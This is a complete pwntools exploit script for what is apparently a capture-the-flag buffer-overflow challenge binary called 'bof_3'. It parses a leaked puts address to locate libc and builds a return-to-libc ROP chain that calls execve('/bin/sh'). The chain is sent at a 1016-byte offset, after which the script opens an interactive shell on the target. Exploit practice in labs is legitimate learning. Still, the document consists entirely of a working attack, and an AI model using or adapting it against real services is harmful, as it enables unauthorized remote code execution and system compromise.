#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('../server/bof_3')

host = args.HOST or 'localhost'
port = int(args.PORT or 42003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.recvuntil(b"puts: ")
puts = int(io.recvline(keepends=False), 16)

if args.LOCAL:
    libc = exe.libc
else:
    # https://libc.rip/download/libc6_2.35-0ubuntu3.1_amd64.so
    libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")

libc.address = 0
libc.address = puts - libc.sym.puts

rop = ROP(libc)
rop.execve(next(libc.search(b"/bin/sh\0")), 0, 0)

print(rop.dump())

io.sendlineafter(b"name: ", flat({
    1016: rop.chain()
}))

io.interactive()

